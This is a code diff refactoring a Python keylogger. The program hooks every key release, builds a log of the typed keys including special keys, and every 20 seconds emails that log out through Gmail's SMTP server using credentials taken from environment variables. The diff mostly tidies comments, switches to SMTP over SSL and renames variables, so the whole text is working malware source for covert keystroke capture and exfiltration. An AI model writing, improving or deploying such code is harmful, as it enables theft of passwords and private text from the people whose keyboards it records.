@@ -8,8 +8,8 @@ from email.mime.text import MIMEText
 
 SEND_REPORT_EVERY = 20  # in seconds
 
-EMAIL_ADDRESS = os.getenv('EMAIL')
-EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD')
+EMAIL_ADDRESS = os.environ.get('GMAIL')
+EMAIL_PASSWORD = os.environ.get('GMAIL_PASSWORD')
 
 
 def mail_subject():
@@ -30,13 +30,12 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
 
-    # Callback invoked on every key release
     def callback(self, event):
+        """
+        Callback invoked on every key release
+        """
         key_name = event.name
-        # not a character, special key (e.g ctrl, alt, etc.)
-        # uppercase with []
-
-        if len(key_name) > 1:
+        if len(key_name) > 1:  # not a character, special key (e.g ctrl, alt, etc.)
             if key_name == "space":
                 key_name = " "
 
@@ -49,8 +48,6 @@ class Keylogger:
             else:
                 key_name = key_name.replace(" ", "_")
                 key_name = f"[{key_name.upper()}]"
-
-        # Add keyname to log
         self.log += key_name
 
     def prepare_mail(self, message):
@@ -58,65 +55,69 @@ class Keylogger:
         msg["From"] = EMAIL_ADDRESS
         msg["To"] = EMAIL_ADDRESS
         msg["Subject"] = "Keylogger logs - " + mail_subject()
-
-        html = f"<p>{message}</p>"
         text_part = MIMEText(message, "plain")
-        html_part = MIMEText(html, "html")
+
         msg.attach(text_part)
+
+        """
+        HTML PART OF THE MESSAGE
+        Uncomment this for additional info
+        
+        html = f"<p>{message}</p>"
+        html_part = MIMEText(html, "html")
         msg.attach(html_part)
-        # after making the mail, convert back as string message
+        
+        msg.as_string() needed if we want to attach the html part
+        """
+
         return msg.as_string()
 
     def sendmail(self, email, password, message, verbose=1):
+        """
+        Function that manages a connection to an SMTP server
 
-        # manages a connection to an SMTP server
+        server.set_debuglevel(1):
+            debug messages for connection and for all messages sent to and received from the server
 
-        # FOR GMAIL
-        # server = smtplib.SMTP_SSL(host = 'smtp.gmail.com', port = 465)
-        #
-        # FOR OFFICE 365
-        # server = smtplib.SMTP(host="smtp.office365.com", port=587)
+        if verbose:
+            Provides additional logging information
+        """
 
-        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
-        server.starttls()  # connect to the SMTP server as TLS mode ( for security )
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.set_debuglevel(0)
         server.login(email, password)
-        message = self.prepare_mail(message)
         server.sendmail(email, email, self.prepare_mail(message))
         server.quit()
 
         if verbose:
-            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
+            print(f"{datetime.now()} - Sent an email to {email} containing:  {message} \n")
 
-    # Gets called every self.interval
-    # Sends keylogs and rests 'self.log'
     def report(self):
+        """
+        Gets called every self.interval / sends keylogs
+
+        timer.daemon = True:
+            dies when main thread dies
+        """
         if self.log:
-            # if there is something in log, report it
             self.end_dt = datetime.now()
             self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             self.start_dt = datetime.now()
 
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
-        # set the thread as daemon (dies when main thread die)
+
         timer.daemon = True
-        # start the timer
         timer.start()
 
     def start(self):
         self.start_dt = datetime.now()
-
-        # start the keylogger
         keyboard.on_release(callback=self.callback)
-
         self.report()
         print(f"{datetime.now()} - Started keylogger")
-
-        # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
 
 
 if __name__ == "__main__":
-    print(mail_subject())
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
